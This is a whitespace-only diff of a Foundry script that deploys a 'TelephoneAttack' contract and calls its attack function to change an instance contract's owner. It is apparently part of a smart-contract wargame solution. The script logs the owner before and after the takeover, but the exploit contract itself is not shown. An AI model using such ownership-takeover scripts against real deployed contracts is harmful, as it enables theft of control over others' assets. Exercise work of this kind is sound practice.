@@ -10,13 +10,13 @@ contract TelephoneScript is Script {
     TelephoneAttack public attacker;
 
     function run() external {
-	vm.startBroadcast();
-	attacker = new TelephoneAttack(address(instance));
-	console.log("TelephoneAttack Contract deployed to:", address(attacker));
-	console.log("Old owner:", instance.owner());
-	console.log("Attacking...");
-	attacker.attack();
-	console.log("New owner:", instance.owner());
-	vm.stopBroadcast();
+        vm.startBroadcast();
+        attacker = new TelephoneAttack(address(instance));
+        console.log("TelephoneAttack Contract deployed to:", address(attacker));
+        console.log("Old owner:", instance.owner());
+        console.log("Attacking...");
+        attacker.attack();
+        console.log("New owner:", instance.owner());
+        vm.stopBroadcast();
     }
 }
